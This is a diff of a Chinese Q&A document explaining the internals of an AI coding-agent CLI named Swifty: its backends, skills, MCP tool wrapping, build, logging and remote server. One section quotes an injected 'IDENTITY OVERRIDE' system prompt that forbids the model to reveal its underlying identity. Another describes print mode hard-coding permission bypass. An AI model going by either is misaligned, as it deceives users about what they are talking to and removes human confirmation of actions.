-后端( `backend.ts`) : `detectBackend()`( line 43-68) 在 win32 上直接返回 `"in-process"`, 否则调 `detectBackendFromEnv()` 按环境探测 —— 检测到 `TMUX` 环境变量返回 `"tmux"`( 每 teammate 一个 tmux 窗口) , 检测到 `ITERM_SESSION_ID` 返回 `"iterm"`, 都没有才回退 `"in-process"`. iterm 后端已实现( line 150-178) : 用 osascript 驱动 iTerm2 AppleScript, 在当前窗口开新标签页执行 teammate 命令( 镜像 tmux 的 new-window 行为) ; 标签页没有可编程句柄, 取消动作交给邮箱 shutdown 流程. tmux 后端则是 `tmux new-window` 失败时回退 `new-session -d` 建独立会话.
+后端( `backend.ts`) : `detectBackend()`( line 43-68) 在 win32 上直接返回 `"in-process"`, 否则调 `detectBackendFromEnv()` 按环境探测 —— 检测到 `TMUX` 环境变量返回 `"tmux"`( 每 teammate 一个 tmux 窗口) , 检测到 `ITERM_SESSION_ID` 返回 `"iterm"`, 都没有才回退 `"in-process"`. iterm 后端已实现( backend.ts:151-175) : 用 osascript 驱动 iTerm2 AppleScript, 在当前窗口开新标签页执行 teammate 命令( 镜像 tmux 的 new-window 行为) ; 标签页没有可编程句柄, 取消动作交给邮箱 shutdown 流程. tmux 后端则是 `tmux new-window` 失败时回退 `new-session -d` 建独立会话.
 
 为什么用文件而不是 IPC/socket: 跨后端可移植 —— 同一套协议在 in-process、子进程、tmux 窗格间都成立; 崩溃恢复天然( 邮箱是持久化的) ; 调试友好( 直接 cat 邮箱文件) . 代价是轮询延迟与锁竞争, 在" teammate 数量少、消息频率低"的场景下完全可接受.
 
@@ -1184,11 +1182,11 @@ inline 模式( `executor.ts`) : 技能正文替换 `$ARGUMENTS` 占位符( 或�
 
 fork 模式: 技能在隔离子代理中运行, 自带上下文, `fork_context` 控制父上下文继承量: `none`( 默认, 完全隔离) / `recent`( 带父对话最近 5 条) / `full`( 最近 100 条) . 适合会产生大量中间输出的任务( 如"批量重构"—— 中间过程不进主线污染上下文, 只回传最终报告) .
 
-目录扫描顺序( `catalog.ts:71-77`, 6 个目录, 后者覆盖同名前者) :
+目录扫描顺序( `catalog.ts:61-68`, 6 个目录, 后者覆盖同名前者) :
 
 ```
-内置技能 → ~/.claude → ~/.github → ~/.swifty
-        → {project}/.claude → {project}/.github → {project}/.swifty
+~/.claude/skills → ~/.github/skills → ~/.swifty/skills
+→ {project}/.claude/skills → {project}/.github/skills → {project}/.swifty/skills
 ```
 
 设计意图:
@@ -1212,7 +1210,7 @@ fork 模式: 技能在隔离子代理中运行, 自带上下文, `fork_context` 
 3. 适配: 每个 MCP 工具包一个 `MCPToolWrapper` 实现统一 `Tool` 接口 —— 名称消毒为 `mcp__{server}__{tool}`( 非字母数字转 `_`) , `execute()` 内部调 `client.callTool()`, 把 MCP 的 content 数组拍平为文本, 保留 `isError`;
 4. 注册: wrapper 注册进全局 `ToolRegistry`, 从此对 Agent/权限/调度完全透明 —— MCP 工具与内置工具走同一条执行管线.
 
-为什么默认 `deferred = true`:
+为什么 MCP 工具注册时默认 `deferred = true`( `mcp/tool-wrapper.ts:78`, eager 模式除外 —— 见 Q101 的三模式策略) :
 
 1. 上下文成本: MCP 服务器动辄暴露几十个工具( 如 GitHub MCP 有 90+) , 全量 schema 会吃掉大量窗口并稀释注意力 —— 延迟加载( Q21) 让模型先经 ToolSearch 发现再启用;
 2. 信任分级: MCP 是第三方代码, schema 里可能含提示注入内容, 不进入初始上下文等于默认最小暴露面;
@@ -1253,12 +1251,12 @@ fork 模式: 技能在隔离子代理中运行, 自带上下文, `fork_context` 
 
 `tsup.config.ts` 的关键决策:
 
-1. 单入口 ESM 产物: `src/main.tsx` → `dist/`, Node 20 target, minify. shebang 通过 banner 注入( `#!/usr/bin/env node`) , 并附 `createRequire` 垫片 —— ESM 产物中某些 CJS 依赖会调用 `require()`, 垫片在 ESM 作用域重建 require.
-2. 全量内联( `noExternal: [/.*/]`) : 除 Node 内建模块和 `@swifty.js/glob-addon`( 原生 C++ addon, 无法打包) 外, 全部依赖打进单文件. 动机:
+1. 单入口 ESM 产物: `src/main.tsx` → `dist/`, Node 20 target, minify. shebang 通过 banner 注入( `#!/usr/bin/env node`) , 并附 `createRequire` 垫片 —— ESM 产物中某些 CJS 依赖会调用 `require()`, 垫片在 ESM 作用域重建 require( 注释点名 signal-exit 这类调用 `require("assert")` 的场景) .
+2. 全量内联( `noExternal: [/.*/]`) : 除三类被 esbuild 插件显式 external 的模块 —— Node 内建模块( `builtinModules` 正则) 、`react-devtools-core`、`sharp`( 原生预编译二进制, 无法打包) —— 全部依赖打进单文件. 动机:
    - 分发可靠性: npm 安装时依赖树解析失败/peer 冲突是 CLI 工具最常见的安装事故, 单文件产物零依赖 = 零安装事故;
    - 启动速度: 单文件免去 Node 在 node_modules 中的模块解析( 成千次 stat) , 冷启动显著更快 —— CLI 对启动延迟极度敏感;
    - 可安装为单二进制: 为后续 SEA( Single Executable Application) 分发铺路.
-3. post-build 资源拷贝( `onSuccess`) : `builtin/`( 内置技能目录, 递归拷贝) 、`glob_addon.node`( Glob/Grep 工具背后的原生 C++ addon, 无法打包, 运行时从 bundle 入口旁加载) 拷入 dist —— 代码内联但二进制资源保持外部文件. 注释还点明了平台相关性问题: addon 是平台专属的, 跨平台分发需要按平台预构建包.
+3. post-build 资源拷贝( `onSuccess`) : 把 `../glob-wasm/build/release.wasm` 拷为 `dist/glob.wasm` —— Glob/Grep 工具由 workspace 包 `@swifty.js/glob-wasm`( WebAssembly 实现, package.json devDependencies) 驱动, 打包进去的是它的 JS wrapper, wasm 二进制在运行时从 bundle 入口旁加载( wrapper 同时内嵌 base64 兜底) . 注释特别点明: 旧的 Node 原生 addon 方案已被替换, wasm 方案天然跨平台, 不再需要按平台预构建.
 
 开发期用 `tsx` 直跑 TS( 免编译) , 测试用 Vitest( 与 tsx 共享 esbuild 转换, 零额外配置) —— 三套工具链共用 esbuild 系, 配置成本最小化.
 
@@ -1268,7 +1266,7 @@ fork 模式: 技能在隔离子代理中运行, 自带上下文, `fork_context` 
 
 答:
 
-合并( `config.ts`, 6 个候选文件按序叠加) : `~/.swifty/config.{yml,yaml}` → `{cwd}/.swifty/config.{yml,yaml}` → `{cwd}/.swifty/config.local.{yml,yaml}`. 合并规则按字段类型定制:
+合并( `config.ts`, `loadConfig()` 的 3 个候选文件按序叠加, config.ts:449-453) : `~/.swifty/config.yaml` → `{cwd}/.swifty/config.yaml` → `{cwd}/.swifty/config.local.yaml`. 合并规则按字段类型定制:
 
 - `providers`: 整体替换( 数组无合并语义, 整体覆盖最不惊讶) ;
 - `mcp_servers`: 按 name 合并( 同名替换, 新名追加 —— 有键集合用键合并) ;
@@ -1288,11 +1286,11 @@ context window 四级解析( `getContextWindowAsync()`) :
 
 ---
 
-### Q57: 项目的测试策略是怎样的? 25+ 测试文件覆盖了哪些关键面? E2E 怎么做?
+### Q57: 项目的测试策略是怎样的? 40+ 测试文件覆盖了哪些关键面? E2E 怎么做?
 
 答:
 
-Vitest v4( v8 coverage) , 测试分层( `tests/`) :
+Vitest v4( v8 coverage) , 测试分层( `tests/`, 43 个测试文件) :
 
 单元层:
 
@@ -1336,7 +1334,7 @@ E2E 层: `run-e2e.mjs` / `run-failing.mjs` —— 用 print 模式( `swifty -p`)
 
 答:
 
-`print-mode.ts` 把 Agent 事件流映射为每行一个 JSON 对象( NDJSON) 输出到 stdout, 供脚本/CI 管道消费. 协议设计( `emitStreamJson()`, line 183) :
+`print-mode.ts` 把 Agent 事件流映射为每行一个 JSON 对象( NDJSON) 输出到 stdout, 供脚本/CI 管道消费. 协议设计( `emitStreamJson()`, print-mode.ts:301) :
 
 在线事件( 随 Agent 循环实时输出) :
 
@@ -1357,9 +1355,9 @@ E2E 层: `run-e2e.mjs` / `run-failing.mjs` —— 用 print 模式( `swifty -p`)
 值得注意的两个取舍:
 
 1. `stream_text`/`thinking_text` 不在线输出: 正文增量被聚合进尾部 `result` 字段, 而非逐 delta 发出. 理由: print 模式的消费者是机器( jq、脚本) , 逐字符的文本流对机器无增量价值, 反而产生大量行解析开销; 工具事件则保留在线, 因为它们有"观测执行进度"的价值. 这与 TUI( 人类消费者, 逐字渲染) 形成对照 —— 输出格式按消费者的消费粒度设计.
-2. 统计尾部化: `num_turns`、累计 usage、工具耗时都只在循环结束才能得出终值, 所以放在 `result` 行. 工具耗时的归因用了个小技巧( line 137) : 从后往前找第一个同名且 `elapsed===0` 的调用记录补上耗时 —— 处理同一工具被多次调用时的配对.
+2. 统计尾部化: `num_turns`、累计 usage、工具耗时都只在循环结束才能得出终值, 所以放在 `result` 行. 工具耗时的归因用了个小技巧( print-mode.ts:245-250) : 从后往前找第一个同名且 `elapsed===0` 的调用记录补上耗时 —— 处理同一工具被多次调用时的配对.
 
-此外 print 模式的权限策略是硬编码 `bypassPermissions`( line 96) —— 非交互环境无法弹对话框, 要么放行要么拒绝, 管道场景选择放行( 使用者需自知风险, 通常配合容器运行) . 错误处理: `text` 模式错误写 stderr( 不污染 stdout 的结果管道) , `stream-json` 模式错误作为 error 行写 stdout( 机器统一解析) .
+此外 print 模式的权限策略是硬编码 `bypassPermissions`( print-mode.ts:200) —— 非交互环境无法弹对话框, 要么放行要么拒绝, 管道场景选择放行( 使用者需自知风险, 通常配合容器运行) . 错误处理: `text` 模式错误写 stderr( 不污染 stdout 的结果管道) , `stream-json` 模式错误作为 error 行写 stdout( 机器统一解析) .
 
 ---
 
@@ -1370,7 +1368,7 @@ E2E 层: `run-e2e.mjs` / `run-failing.mjs` —— 用 print 模式( `swifty -p`)
 `teammate.ts` 是一个无 UI、邮箱驱动的长驻 Agent 进程. 生命周期( `runTeammate()`) :
 
 1. 初始化: 独立 sessionId( `teammate-{name}-{ts}`) , logger 模式 `"teammate"` 且 `skipCleanup: true`( 避免多进程并发删日志的竞态) .
-2. 构造 Agent: 注册 6 个核心工具( Read/Bash/Glob/Grep/Write/Edit) 之外还有 ToolSearch、SyntheticOutput、Worktree 工具( Enter/Exit) 、技能工具( LoadSkill/InstallSkill) 、团队通信与任务工具( SendMessage + TaskCreate/TaskGet/TaskList/TaskUpdate) 、以及配置的 MCP 工具( `teammate.ts:147-189`) —— 唯独没有 Agent/TeamCreate/TeamDelete, 即 teammate 不能再派生子代理或团队. 权限模式固定 `acceptEdits`.
+2. 构造 Agent: 注册 7 个核心读写工具( Read/Bash/PowerShell/Glob/Grep/Write/Edit) 之外还有 ToolSearch、McpCall、SyntheticOutput、Worktree 工具( Enter/Exit) 、技能工具( LoadSkill/InstallSkill) 、团队通信与任务工具( SendMessage + TaskCreate/TaskGet/TaskList/TaskUpdate) 、以及配置的 MCP 工具( `teammate.ts:146-201` `buildTeammateRegistry()`) —— 唯独没有 Agent/TeamCreate/TeamDelete, 即 teammate 不能再派生子代理或团队. 权限模式固定 `acceptEdits`.
 3. 执行初始任务: `--task` 参数作为首条 user 消息, 跑一轮完整 Agent 循环, `stream_text` 直接写 stdout.
 4. 上报 idle: 任务完成 → 向 lead 邮箱发 `[idle] {name} has completed their task...`.
 5. 待命循环: `mailbox.poll(2000)` 每 2 秒轮询自己的邮箱:
@@ -1385,7 +1383,7 @@ E2E 层: `run-e2e.mjs` / `run-failing.mjs` —— 用 print 模式( `swifty -p`)
 | 输入来源     | 文件邮箱                       | 键盘       | CLI 参数 |
 | 输出去向     | stdout + 邮箱通知              | Ink 渲染   | stdout   |
 | 权限         | acceptEdits( 无人确认写操作)   | 四模式可切 | bypass   |
-| 上下文管理   | 无压缩注入( 简配)              | 完整       | 完整     |
+| 上下文管理   | 压缩可用( RecoveryState 默认实例) , 压缩后仅重注入技能清单, 不注入项目指令/长期记忆 | 完整       | 完整     |
 
 teammate 的本质是"Agent 即服务( 进程) ": lead 通过写邮箱下发任务, teammate 执行后回写结果 —— 文件邮箱既是消息队列也是 RPC 通道. 注意它刻意不做"接到新消息就打断当前任务": 轮询只在 idle 时发生, 运行中的任务不可抢占, 语义简单可靠.
 
@@ -1422,7 +1420,7 @@ onPermissionRequest: async (toolName, args, decision) => {
 设计细节:
 
 1. `streaming` 互斥标志: 同一时间只允许一个会话流, 并发的 `user_message` 直接丢弃 —— 避免多客户端同时驱动导致对话状态错乱( 当前是"广播即共享屏幕"模型, 所有客户端看到同一对话) .
-2. agent 惰性初始化: `createRemoteAgent()` 失败时不阻塞服务器启动, 降级为"首条消息时重试"( `run()` line 1449-1462) .
+2. agent 惰性初始化: `createRemoteAgent()` 失败时不阻塞服务器启动, 降级为"首条消息时重试"( `ensureAgent()`, server.ts:909-938) .
 3. 取消语义: `cancel` 消息调 `agentHandle.abort()` —— AbortController 贯穿到 LLM 流与工具执行.
 4. 命令体系复用: 同一套 CommandRegistry 在 WS 侧按 type 分发( local → system 消息; local_ui → 专属处理; prompt → 走 agent 循环; skill_fork 明确报"暂不支持"—— 远程模式下子代理 fork 的 UI 缺失时显式降级而非静默失败) .
 
@@ -1432,16 +1430,16 @@ onPermissionRequest: async (toolName, args, decision) => {
 
 答:
 
-`serveStatic()`( `server.ts:121`) 服务 `fe/dist/` 目录, 安全措施:
+`serveStatic()`( `server.ts:153`) 服务 `fe/dist/` 目录, 安全措施:
 
 1. 路径归一化: `normalize(path).replace(/^(\.\.[/\\])+/, "")` 先剥离开头的 `../` 序列;
 2. 根目录校验: 拼接后 `fullPath.startsWith(FE_DIST)` 二次确认 —— 双重防御目录穿越( normalize 处理 `..`, startsWith 兜底绝对路径与符号链接逃逸) ;
 3. 存在性与类型检查: `existsSync && isFile()`, 目录请求拒绝;
 4. MIME 白名单: 显式后缀映射表, 未知后缀 `application/octet-stream`( 浏览器下载而非渲染, 避免 content sniffing XSS) .
 
-SPA fallback: 请求路径找不到文件时回退到 `index.html`( line 666-672) —— 前端用客户端路由( React Router 类) , 刷新 `/chat/xxx` 这类路径时服务器返回应用外壳, 由 JS 路由接管. 这是静态站点服务 SPA 的标准做法.
+SPA fallback: 请求路径找不到文件时回退到 `index.html`( server.ts:803-804) —— 前端用客户端路由( React Router 类) , 刷新 `/chat/xxx` 这类路径时服务器返回应用外壳, 由 JS 路由接管. 这是静态站点服务 SPA 的标准做法.
 
-健康检查端点 `/health` 返回 `{status:"ok", clients: n}` 便于探活. 整体不到 700 行实现了一个功能完整的远程 Agent 服务器 —— 归功于 Koa 只做静态文件+WS 挂载点, 业务逻辑全部复用 Agent 核心.
+健康检查端点 `/health` 返回 `{status:"ok", remote: true, clients: n}` 便于探活. server.ts 约 1680 行实现了一个功能完整的远程 Agent 服务器 —— 归功于 Koa 只做静态文件+WS 挂载点, 业务逻辑全部复用 Agent 核心.
 
 ---
 
@@ -1453,23 +1451,23 @@ SPA fallback: 请求路径找不到文件时回退到 `index.html`( line 666-672
 
 | 依赖           | TUI (app.tsx) | remote      | print  | teammate                                                      |
 | -------------- | ------------- | ----------- | ------ | ------------------------------------------------------------- |
-| 核心工具 6 件  | 有            | 有          | 有     | 有                                                            |
+| 核心读写工具   | 有            | 有          | 有     | 有                                                            |
 | ToolSearch     | 有            | 有          | 有     | 有                                                            |
 | Task/TaskStore | 有            | 有          | 无     | 有                                                            |
 | Worktree 工具  | 有            | 有          | 无     | 有                                                            |
 | 技能系统       | 有            | 有          | 无     | 有                                                            |
 | Hook 引擎      | 有            | 有          | 无     | 无                                                            |
-| MCP            | 有            | 有          | 无     | 有                                                            |
+| MCP            | 有            | 有          | 有     | 有                                                            |
 | 记忆系统       | 有            | 有          | 无     | 无                                                            |
-| 团队系统       | 有            | 有          | 无     | 有( 仅 SendMessage/Task 工具, 无 Agent/TeamCreate/TeamDelete) |
+| 团队系统       | 有            | 有          | 有( TeamCreate/SendMessage/TeamDelete/TaskStop + Agent 子代理) | 有( 仅 SendMessage/Task 工具, 无 Agent/TeamCreate/TeamDelete) |
 | 权限模式       | 四模式可切    | acceptEdits | bypass | acceptEdits                                                   |
 | 会话持久化     | 有            | 有          | 无     | 无                                                            |
 
 规律: 越"无人值守"的模式, 组装越精简, 但精简的对象不同.
 
-- print 最精简: 连会话持久化都砍掉 —— 一次性运行, 无状态; 也没有 ToolSearch/技能/团队等扩展面;
-- teammate 砍掉的是"交互设施"( Hook、记忆、UI) 与"派生能力"( 没有 Agent/TeamCreate/TeamDelete, 防止 teammate 再嵌套派生) , 但保留完整的读写与发现工具集( ToolSearch、技能、MCP、Task、Worktree、SendMessage) —— 它是长驻的独立工作者, 需要干活的完整能力;
-- remote 几乎全量保留( 浏览器也是"完整客户端") , 权限固定 `acceptEdits` 模式( `server.ts:546`) —— 远程场景写操作免确认以保证浏览器侧操作流畅, 但命令仍需确认, 且不能信任客户端切到 bypass.
+- print 砍掉的是状态与交互设施: 无会话持久化( 一次性运行) 、无 TaskStore、无 Worktree 工具、无技能、无 Hook、无记忆; 但保留了完整的执行与协作面 —— ToolSearch、MCP 工具、子代理( AgentTool) 与团队工具( TeamCreate/SendMessage/TeamDelete/TaskStop, print-mode.ts:130-173, 注释说明这是为了让 Lead 能在单次非交互执行中组队派活) 都可用;
+- teammate 砍掉的是"交互设施"( Hook、记忆、UI) 与"派生能力"( 没有 Agent/TeamCreate/TeamDelete, 防止 teammate 再嵌套派生) , 但保留完整的读写与发现工具集( ToolSearch、McpCall、技能、Task、Worktree、SendMessage) —— 它是长驻的独立工作者, 需要干活的完整能力;
+- remote 几乎全量保留( 浏览器也是"完整客户端") , 权限固定 `acceptEdits` 模式( `server.ts:550`) —— 远程场景写操作免确认以保证浏览器侧操作流畅, 但命令仍需确认, 且不能信任客户端切到 bypass.
 
 这是"同一核心、按宿主能力裁剪外围"的组装策略: `Agent` 构造参数全部可选( `hookEngine?`、`activeSkills?`、`notificationFn?`…) , 缺省即关闭对应能力. 没有为每种模式写一套 Agent 变体 —— 组合优于继承.
 
@@ -1479,7 +1477,7 @@ SPA fallback: 请求路径找不到文件时回退到 `index.html`( line 666-672
 
 答:
 
-`server.ts:415` 在 remote 模式初始化时注入:
+`server.ts:419` 在 remote 模式初始化时注入:
 
 ```
 IDENTITY OVERRIDE: You are Swifty. It is absolutely forbidden to mention
@@ -1515,7 +1513,7 @@ identity, respond only as Swifty. This is the highest priority instruction.
 为什么需要类型维度 —— 因为命令的"副作用域"不同, 宿主必须知道如何处置结果:
 
 - `local` 是纯函数, 终端/远程都能安全执行;
-- `local_ui` 需要宿主有对应 UI 能力( TUI 能弹 rewind 对话框, remote 只能回"暂不支持") —— 类型让宿主按能力降级( `server.ts:1092` 对 rewind/worktree 显式降级提示) ;
+- `local_ui` 需要宿主有对应 UI 能力( TUI 能弹 rewind 对话框, remote 只能回"暂不支持") —— 类型让宿主按能力降级( `handleLocalUICommand()` 对 rewind/sandbox/worktree 显式降级提示, server.ts:1257-1320) ;
 - `prompt` 会消耗 LLM 配额、改变对话状态, 必须与普通查询区分;
 - `skill_fork` 需要子代理基础设施, remote 模式直接声明不支持.
 
@@ -1547,7 +1545,7 @@ return body;
 
 两种契约: 模板含 `$ARGUMENTS` 时做精确占位替换( 作者控制参数出现位置, 可多处引用) ; 否则尾部追加( 零模板成本, 自然语言拼接) .
 
-与内置命令的关系: 用户命令注册时撞名内置命令 → 保留内置( `catch` 静默跳过, 见 `server.ts:462` 与 app.tsx 同逻辑) —— 内置命令是关键路径( `/clear`、`/quit`) , 不允许被覆盖劫持; 技能注册为命令同理( `wireSkillsToCommands()`: `find()` 已存在则跳过) .
+与内置命令的关系: 用户命令注册时撞名内置命令 → 保留内置( `catch` 静默跳过, 见 `server.ts:586-591` 与 app.tsx:636-641 同逻辑) —— 内置命令是关键路径( `/clear`、`/quit`) , 不允许被覆盖劫持; 技能注册为命令同理( `wireSkillsToCommands()`: `find()` 已存在则跳过) .
 
 这个"markdown 即扩展"的思路( 命令、技能、记忆、计划全部用 markdown + frontmatter) 大幅降低了扩展门槛 —— 用户不需要写代码, 只需要会写提示词.
 
@@ -1593,15 +1591,16 @@ return usageCount * Math.max(recency, 0.1);
 
 XML 风格标签包裹 + path 属性 —— 让模型明确知道"这是用户主动引用的文件内容", 与工具读文件的 tool_result 区分开.
 
-双文本策略( `app.tsx:1618`) :
+双文本策略( `app.tsx:1866`) :
 
 ```ts
-convRef.current.addUserMessage(expandAtRefs(text, workDir)); // LLM 看到展开版
+const expanded = await expandAtRefsWithImages(text, workDir); // LLM 看到展开版( 文本内联 + 图片 content block)
+convRef.current.addUserMessage(expanded);
 // 而 session 持久化与 UI 展示用的是原始 text( 含 @path 标记)
 ```
 
 - 会话记录存原始版: `@src/foo.ts` 只有几个字符 —— 会话文件不被展开内容撑大; 恢复会话时不会因文件已变化而困惑; UI 显示用户真实输入;
-- LLM 收展开版: 模型需要文件内容才能回答.
+- LLM 收展开版: 模型需要文件内容才能回答. `expandAtRefsWithImages()`( at-expand.ts:106) 在文本内联之外还支持 `@path#L3-10` 行范围引用( IDE 集成插入的锚点, 截取指定行内联) 与图片引用( png/jpg/gif/webp 加载为 base64 image content block, 每条消息上限 10 张).
 
 失败语义: 文件不存在/超限/是目录 → 原样保留 `@token` 文本, 模型会自己用 ReadFile 工具去读 —— 优雅降级为工具调用, 不报错打断用户.
 
@@ -1644,7 +1643,7 @@ Fuse.js 配置( `keys: [{name:"name",weight:3},{name:"aliases",weight:2},{name:"
 
 双向依赖边的意义: `addBlocks(A, [B])` 同时维护 `A.blocks=[B]` 与 `B.blockedBy=[A]` —— 冗余存储让两个方向的查询都是 O(1): "这个任务阻塞了什么"( 排期决策) 与"这个任务被什么阻塞"( 就绪检查) . 这是图存储的经典空间换时间: 写入时双写, 读取时免遍历. 对 Coding Agent 场景, 模型可以用它表达"先修类型错误 → 再改调用方"的任务 DAG, 而不是扁平清单.
 
-工具元数据( `todo/tools.ts`) : 4 个 Task 工具( TaskCreate/TaskGet/TaskList/TaskUpdate) 只标记 `category = "read"`, 没有 `system`、也没有 `deferred` 标记 —— 这是刻意的. `types.ts:71-77` 的注释说明了原因: `deferred` 只给 MCP 工具用( MCP 是 per-project 配置、单服务器可能几十个工具且 schema 冗长, 全塞进初始列表会吃掉大块上下文) , 内置工具数量固定可控、隐藏它们只会逼模型多走一次 ToolSearch 往返, 所以内置工具永不 deferred —— Task 工具作为内置工具, schema 直接进初始列表, 随用随调.
+工具元数据( `todo/tools.ts`) : 4 个 Task 工具( TaskCreate/TaskGet/TaskList/TaskUpdate) 只标记 `category = "read"`, 没有 `deferred` 标记 —— 这是刻意的. `types.ts:92-104` 的注释说明了原因: `deferred` 只给 MCP 工具用( MCP 是 per-project 配置、单服务器可能几十个工具且 schema 冗长, 全塞进初始列表会吃掉大块上下文) , 内置工具数量固定可控、隐藏它们只会逼模型多走一次 ToolSearch 往返, 所以内置工具永不 deferred —— Task 工具作为内置工具, schema 直接进初始列表, 随用随调.
 
 `category: "read"` 的作用: 任务操作不触碰用户文件系统, 归入最安全类别 —— 权限层直接放行, 且 `partitionToolCalls()` 允许它们与其他 read 工具并行.
 
@@ -1671,25 +1670,30 @@ Fuse.js 配置( `keys: [{name:"name",weight:3},{name:"aliases",weight:2},{name:"
 
 ---
 
-### Q72: logger 系统的 Proxy 惰性初始化、AsyncLocalStorage 上下文合并分别解决了什么问题?
+### Q72: logger 系统的 Proxy 惰性初始化、模块级 child logger 分别解决了什么问题?
 
 答:
 
-Proxy 惰性初始化( `logger.ts:170`) :
+Proxy 惰性初始化( `logger.ts:216`) :
 
 ```ts
-export const logger = new Proxy(silentPino, {
-  get: (_, prop) => currentLogger[prop],
+export const logger = new Proxy(silentFallback, {
+  get(_target, prop, receiver) {
+    const current = getLogger();
+    const target = current ?? _target;
+    const value = Reflect.get(target, prop, receiver);
+    return typeof value === "function" ? value.bind(target) : value;
+  },
 });
 ```
 
-问题: 模块导入顺序上, 很多模块( 工具、子系统) 在 `initLogger()` 之前就 import 了 logger 并可能在模块顶层打日志. 若 logger 是"初始化前为 null"的普通变量, 调用方要么判空要么崩溃. Proxy 方案: 导出绑定永远有效 —— 初始化前代理到 silent 实例( 安全 no-op) , 初始化后 `get` trap 转发到真实 logger. 调用方无感知, 零判空样板. 这是"Null Object 模式 + 动态转发"的组合.
+问题: 模块导入顺序上, 很多模块( 工具、子系统) 在 `initLogger()` 之前就 import 了 logger 并可能在模块顶层打日志. 若 logger 是"初始化前为 null"的普通变量, 调用方要么判空要么崩溃. Proxy 方案: 导出绑定永远有效 —— 初始化前代理到 silent 实例( 真实的 `pino({ level: "silent" })`, 安全 no-op) , 初始化后 `get` trap 转发到真实 logger( 函数值还做 bind 保证 this 正确, `set` trap 把 `logger.level = ...` 这类写入也路由到活实例) . 调用方无感知, 零判空样板. 这是"Null Object 模式 + 动态转发"的组合.
 
-AsyncLocalStorage 上下文( `context.ts`) : 问题 —— 子代理/teammate 执行任务时, 希望日志自动带上 `agentName/agentKind/toolName` 标签, 但这些标签产生在调用栈深处, 逐层传参污染所有函数签名. ALS 方案: `withLogContext({agentKind:"subagent", agentName:"explore"}, fn)` 包裹执行, `mergeContext()` 在序列化时从 `logContext.getStore()` 取出并入每条日志 —— 隐式上下文沿异步调用链自动传播, 跨越工具执行、子代理派生而无需传参. 这正是 React Context / Node `AsyncLocalStorage` 在服务端 tracing( OpenTelemetry) 中的标准用法.
+模块级上下文绑定( `createChildLogger()`, logger.ts:244-277) : 问题 —— 各子系统希望日志自动带上 `module` 标签( session/tools/tui/subagent…) , 但逐层传参污染所有函数签名. 解法是工厂返回一个 Proxy, 惰性解析"当前根 logger 的 child"( `current.child(bindings)` 结果缓存, 根 logger 重建时才重新派生) —— 模块顶层 `const log = createChildLogger({ module: "session" })` 一次声明, 之后标签沿调用链隐式出现且跨 `initLogger()` 重初始化仍然有效.
 
 同步写设计: `pino.destination(fd)` 用文件描述符同步写而非默认的 worker 线程异步写 —— 因为 tsup 全量打包后 worker 线程的模块解析会失效( worker 需要独立入口文件) , 同步写规避了打包复杂度, 日志量小的场景性能无损. 这又是"构建产物约束反向影响运行时设计"的例子( 呼应 Q55 的全量内联决策) .
 
-日志轮转: 30 天 mtime 过期清理, 主进程专属( `skipCleanup` 防 teammate 子进程并发 unlink 竞态) .
+日志轮转: 30 天 mtime 过期清理( 扫描 `.swifty/logs/` 与 `~/.swifty/teams/*/logs/`) , 主进程专属( `skipCleanup` 防 teammate 子进程并发 unlink 竞态) .
 
 ---
 
@@ -1753,7 +1757,7 @@ AsyncLocalStorage 上下文( `context.ts`) : 问题 —— 子代理/teammate �
 
 答:
 
-`/resume <id>` 的重建( `app.tsx:822`) 是双轨的:
+`/resume <id>` 的重建( `app.tsx:983`) 是双轨的:
 
 对话状态重建( 发给 LLM 的上下文) :
 
@@ -1792,9 +1796,9 @@ UI 状态重建( 用户看到的画面) :
 
 实现对比的核心: 两者都在"管理上下文", 但一个是"换房间", 一个是"整理房间".
 
-`/clear` 的实现要点( `app.tsx:709`) : 几乎重建所有会话级 ref( conv/sessionId/taskStore/fileHistory/记忆提取游标) , 并直接 `process.stdout.write` ANSI 清屏序列 —— 绕过 React/Ink 直接操作终端, 因为清屏语义是"终端级"的而非"组件级"的.
+`/clear` 的实现要点( `app.tsx:866`) : 几乎重建所有会话级 ref( conv/sessionId/taskStore/fileHistory/记忆提取游标) , 并直接 `process.stdout.write` ANSI 清屏序列 —— 绕过 React/Ink 直接操作终端, 因为清屏语义是"终端级"的而非"组件级"的.
 
-`/compact` 的实现要点( `app.tsx:787`) : 调 `forceCompact()` 后立即 `saveCompactBoundary()` —— 手动压缩也必须落 boundary, 否则 `/resume` 会恢复压缩前的膨胀历史. remote 模式的 `/compact`( `server.ts:1182`) 同样遵循此约束.
+`/compact` 的实现要点( `app.tsx:947`) : 调 `forceCompact()` 后立即 `saveCompactBoundary()` —— 手动压缩也必须落 boundary, 否则 `/resume` 会恢复压缩前的膨胀历史. remote 模式的 `/compact`( `server.ts:1351` `handleCompact()`) 同样遵循此约束.
 
 ---
 
@@ -1954,25 +1958,27 @@ function createIncrementalMarkdown(parse: (src: string) => string) {
 
 ### Q83: 手写: 实现文件邮箱的互斥锁( O_EXCL 锁文件 + stale 检测 + 退避) .
 
-题目: 多进程向同一 JSONL 文件追加消息, 要求互斥. 用 `wx`( 排他创建) 锁文件实现 `withLock(fn)`: 最多尝试 10 次, 锁文件超过 10 秒视为 stale 可强取, 退避为 5–100ms 随机同步等待.
+题目: 多进程向同一 JSON 数组文件追加消息, 要求互斥. 用 `wx`( 排他创建) 锁文件实现 `withLock(fn)`: 总获取超时 5 秒( 超时抛错而非静默丢消息) , 锁文件超过 10 秒视为 stale 可强取, 重试用指数退避加抖动( 5ms 起、上限 80ms) 的同步等待.
 
 参考答案:
 
 ```ts
-import { openSync, closeSync, writeSync, unlinkSync, statSync } from "node:fs";
+import { openSync, closeSync, unlinkSync, statSync } from "node:fs";
 
 function sleepSync(ms: number) {
   Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms);
 }
 
 function withLock<T>(lockPath: string, fn: () => T): T {
-  const MAX_ATTEMPTS = 10,
+  const DEADLINE_MS = 5_000,
     STALE_MS = 10_000;
-  for (let attempt = 0; ; attempt++) {
+  const deadline = Date.now() + DEADLINE_MS;
+  let backoff = 5;
+
+  for (;;) {
     let fd: number | null = null;
     try {
       fd = openSync(lockPath, "wx"); // 原子抢锁
-      writeSync(fd, String(process.pid));
       return fn(); // 临界区
     } catch (err: any) {
       if (err.code === "EEXIST") {
@@ -1985,8 +1991,11 @@ function withLock<T>(lockPath: string, fn: () => T): T {
         } catch {
           /* 锁已被释放, 直接重试 */
         }
-        if (attempt >= MAX_ATTEMPTS - 1) throw err;
-        sleepSync(5 + Math.floor(Math.random() * 96)); // 随机退避防惊群
+        if (Date.now() >= deadline) {
+          throw new Error(`lock timeout after ${String(DEADLINE_MS)}ms`);
+        }
+        sleepSync(backoff); // 指数退避
